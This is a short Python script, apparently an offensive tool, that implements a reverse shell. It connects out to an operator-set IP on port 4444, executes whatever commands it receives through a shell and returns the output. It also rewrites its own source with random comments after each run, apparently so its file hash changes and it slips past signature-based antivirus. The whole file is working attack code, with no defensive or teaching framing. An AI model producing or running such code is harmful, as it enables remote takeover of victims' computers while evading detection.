import socket
import subprocess
import random
import string
import os
import time
import signal
import sys
import hashlib
def reverse_shell(server_ip, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                print("[INFO] Exiting...")
                break
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
            s.send(result.encode("utf-8"))
def add_random_comment():
    random_comment = f"# Random comment: {''.join(random.choices(string.ascii_letters, k=10))}\n"
    return random_comment
def self_modify():
    # Ensure any file operations are complete
    time.sleep(0.5)
    
    with open(__file__, 'r') as file:
        lines = file.readlines()
    
    # Random comment at a random position in the code
    insertion_index = random.randint(0, len(lines) - 1)
    lines.insert(insertion_index, add_random_comment())
    
    with open(__file__, 'w') as file:
        file.writelines(lines)
def print_signature():
    # SHA-256 of current file
    with open(__file__, 'rb') as file:
        file_data = file.read()
        signature = hashlib.sha256(file_data).hexdigest()
    print(f"[INFO] File signature (SHA-256): {signature}")
def handle_exit(signum, frame):
    print("[INFO] Signal received, exiting...")
    sys.exit(0)
if __name__ == "__main__":
    SERVER_IP = "YOUR_IP" # Your IP here
    SERVER_PORT = 4444
    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)
    try:
        print_signature()
        reverse_shell(SERVER_IP, SERVER_PORT)
    except KeyboardInterrupt:
        print("Keyboard interrupt received. Exiting...")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        self_modify()
